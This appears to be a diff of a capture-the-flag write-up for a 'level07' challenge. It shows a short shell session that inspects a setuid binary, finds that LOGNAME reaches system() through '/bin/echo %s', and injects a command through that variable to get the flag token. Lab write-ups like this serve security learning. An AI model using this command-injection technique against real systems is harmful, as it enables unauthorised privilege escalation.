@@ -1,9 +1,8 @@
 $> ./level07
 level07
+
 $> nm -u level07
-        w _Jv_RegisterClasses
-         w __gmon_start__
-         U __libc_start_main@@GLIBC_2.0
+[...]
          U asprintf@@GLIBC_2.0
          U getegid@@GLIBC_2.0
          U getenv@@GLIBC_2.0
@@ -12,20 +11,23 @@ $> nm -u level07
          U setresuid@@GLIBC_2.0
          U system@@GLIBC_2.0
 
-strings level07
+$> strings level07
 [...]
 LOGNAME
 /bin/echo %s
 [...]
 
-$> tested to rename the file level07 to change the output, nothing happened to change
+# Try to rename the file level07 to change the output, nothing happened to change
 
 $> LOGNAME=$(getflag)
 
 $> ./level07
 [parentheses error]
 
+# Something to dig here with parentheses to escape
+
 $> LOGNAME=$\(getflag\)
-./level07
+
+$> ./level07
 
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
